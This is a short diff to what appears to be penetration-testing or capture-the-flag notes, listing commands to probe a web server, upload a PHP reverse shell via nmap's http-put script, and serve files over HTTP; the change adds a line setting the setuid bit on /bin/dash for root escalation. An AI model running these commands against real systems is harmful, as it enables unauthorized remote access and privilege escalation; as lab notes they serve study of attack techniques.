@@ -10,5 +10,6 @@ curl -v -X OPTIONS http://<ip>
 nmap -p80 <ip> --script http-put --script-args http-put.url='/test/php-reverse-shell.php',http-put.file='php-reverse-shell.php'
 
 python -m SimpleHTTPServer 8000
+chmod u+s /bin/dash
 
 tesseract blow.jpg output --oem 1 -l eng
